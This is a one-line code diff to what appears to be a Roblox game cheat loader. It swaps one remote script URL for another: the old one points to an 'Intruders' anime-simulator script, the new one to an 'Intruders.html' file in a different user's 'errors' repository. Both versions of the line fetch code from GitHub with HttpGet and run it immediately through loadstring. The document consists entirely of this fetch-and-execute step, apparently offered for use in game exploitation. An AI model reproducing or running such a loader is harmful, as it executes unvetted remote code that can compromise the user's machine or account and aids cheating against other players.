@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/tozxart/The-Intruders/main/AnimeLostSimulator.lua"))()
+loadstring(game:HttpGet"https://raw.githubusercontent.com/lifaiossama/errors/main/Intruders.html")()
